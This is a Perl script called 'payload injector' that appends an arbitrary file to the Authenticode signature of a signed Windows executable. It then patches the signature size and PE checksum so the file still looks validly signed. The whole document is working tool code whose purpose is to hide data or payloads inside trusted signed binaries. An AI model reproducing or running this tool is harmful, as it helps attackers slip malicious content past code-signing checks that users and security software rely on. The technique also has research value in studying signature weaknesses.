#!/usr/bin/perl

# payload injector
# Copyright (c) 2012 Cristian Sava <cristianzsava@gmail.com> 
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
#
# Inspired by Didier Stevens's Python program Disitool

use warnings;
use strict;
use 5.010;

# fh - file handler
my( $fh_src, $fh_inj, $fh_dst );
# size of the 2 processed files
my( $src_size, $inj_size ) = ( 0, 0 );
# files data
my $src_buffer;
my $inj_buffer;
my $dst_buffer = 0;

# offsets in the source EXE file
my( $PEHeader, $PESecurity ) = ( 0, 0 );

# the SECURITY entry in the IMAGE_DATA_DIRECTORY structure 
my( $SEC_addr, $SEC_size ) = ( 0, 0 ); 

sub read_file
{
    # fs - file size
    my( $fh, $ref_buffer, $ref_fs ) = @_;
    
    ${$ref_fs} = -s $fh if defined $ref_fs && defined $fh;
    
    return read $fh, ${$ref_buffer}, ${$ref_fs}; 
}

sub write_to_file
{
    my( $fh, $buffer ) = @_;
    
    die "Failed! Cannot write to file: $!\n" unless defined $fh;
    
    return print $fh $buffer;
}

sub open_file
{
    my( $ref_fh, $name, $mode ) = @_;
    
    my $open_mode = substr( $mode, 0, 1 );
    my $file_mode = substr( $mode, 1, 1 );
    
    my $omode = ' ';
    given( $open_mode )
    {
        when( 'r' ) { $omode = '<' }
        when( 'w' ) { $omode = '>' }
        when( 'a' ) { $omode = '>>' }
    }
    
    my $fmode = ( $file_mode eq 'b' ) ? 1 : 0;
    
    die "Bad file mode specified in open_file! Use r, w, a with t(text) and b(binary)\n" unless $omode ne ' ';
    
    open ${$ref_fh}, $omode, $name or die "Failed! Could not open file $name: $!\n";
    
    binmode ${$ref_fh} if $fmode;
}

sub close_file
{
    my ( $fh ) = @_;
    close $fh;                                      
}

sub validate_input_file
{
    my( $buffer ) = @_;
    {
        use bytes;
            
        return 0 unless length( $buffer ) >= 64;
    }
    
    # check for DOS HEADER
    return 0 unless $buffer =~ /\AMZ/;
    # check for PE signature
    my $fdata = substr( $buffer, 60, 4 );
    $PEHeader = unpack( "I", $fdata );
    $fdata = substr( $buffer, $PEHeader, 4 );
    return 0 unless $fdata eq "PE\0\0";
    
    # check if file is PE32 or PE32+
    $fdata = substr( $buffer, $PEHeader + 24, 2 );
    my $PE32plus = unpack( "v", $fdata );
    $PE32plus = ( $PE32plus == 0x20B ) ? 1 : 0;
    
    # gets the SECURITY _IMAGE_DATA_DIRECTORY entry
    $PESecurity = $PEHeader + 24 + 128 + $PE32plus * 16;
    $fdata = substr( $buffer, $PESecurity, 4 );
    $SEC_addr = unpack( "I", $fdata );
    $fdata = substr( $buffer, $PESecurity + 4, 4 );
    $SEC_size = unpack( "I", $fdata );
    # returns if file is not signed
    return 0 unless $SEC_addr != 0;
       
    1;
}

sub compute_checksum
{
    my( $buffer, $buffer_size, $checksum_pos ) = @_;
    my $checksum = 0;
    
    my $limit = 2 ** 32;
    my $size = $buffer_size / 4;
    for( my $i = 0; $i < $size; $i++ )
    {
        next if $i * 4 == $checksum_pos;
        
        my $fdata = substr( $buffer, $i * 4, 4 );
        my $dword = unpack( "I", $fdata );
        
        $checksum = ( $checksum & 0xffffffff ) + $dword + ( $checksum >> 32 );
        if( $checksum > $limit )
        {
            $checksum = ( $checksum & 0xffffffff ) + ( $checksum >> 32 );
        }  
    }
    
    $checksum = ( $checksum & 0xffff ) + ( $checksum >> 16 );
    $checksum = $checksum + ( $checksum >> 16 );
    $checksum = $checksum & 0xffff;
    
    $checksum += $buffer_size;
        
    $checksum;
}

sub inject
{
    my( $padding, $calculate_checksum ) = @_;
     
    if( ( length $inj_buffer ) % 8 != 0 )
    {
        if( !$padding )
        {
            print "Warning: injection file lenght is not a multiple of 8; you should use --paddata\n";
        }
        else
        {
            my $pad_size = 8 - ( length $inj_buffer ) % 8;
            $inj_buffer .= chr( 0 ) x $pad_size;
            $inj_size += $pad_size;
            print "Padded the injection file\n"
        }
    }
    
    # writes the destination file
    $dst_buffer = $src_buffer . $inj_buffer;
    &write_to_file( $fh_dst, $dst_buffer );
    
    # expands the size of the file signature
    $SEC_size += $inj_size;
    my $new_size = pack( "I", $SEC_size );
    seek( $fh_dst, $PESecurity + 4, 0 );
    print $fh_dst $new_size;     
    
    # get the length in bytes of the dst file
    my $buffer_size;
    {
        use bytes;
            
        $buffer_size =  length( $dst_buffer );
    }
    # sets the checksum
    my $buffer2 = substr( $dst_buffer, 0, $PESecurity + 4 ) . $new_size . substr( $dst_buffer, $PESecurity + 8, $buffer_size - $PESecurity - 8 );
    my $checksum = 0;
    if( $calculate_checksum )
    {
        $checksum = &compute_checksum( $buffer2, $buffer_size, $PEHeader + 88 );
    }
    my $new_checksum = pack( "I", $checksum );
    seek( $fh_dst, $PEHeader + 88, 0 );
    print $fh_dst $new_checksum;
    
    1;
}



@ARGV == 3 or @ARGV == 4 or die "Usage: pi src_file inj_file dst_file [--paddata]
    where   src_file: signed EXE file that needs to be expanded
            inj_file: file to be injected in the signed executable
            dst_file: name of the signed file which will contain inj_file
            --paddata: add extra padding bytes to inj_file if needed\n";

my $padding = ( @ARGV == 4 && $ARGV[3] eq '--paddata' ) ? 1 : 0;

# Get all 3 file handles
&open_file( \$fh_src, $ARGV[0], 'rb' );
&open_file( \$fh_inj, $ARGV[1], 'rb' );
&open_file( \$fh_dst, $ARGV[2], 'wb' );

&read_file( $fh_src, \$src_buffer, \$src_size ) or die "Failed! Error while processing file $ARGV[0]\n";
# Makes sure the signed file is a valid EXE file
&validate_input_file( $src_buffer ) or die "Failed! $ARGV[0] is not a valid, signed EXE file\n";

&read_file( $fh_inj, \$inj_buffer, \$inj_size ) or die "Failed! Error while processing file $ARGV[1]\n";

&inject( $padding, 1 );

&close_file( $fh_src );
&close_file( $fh_inj );
&close_file( $fh_dst );

print "Done.\n";
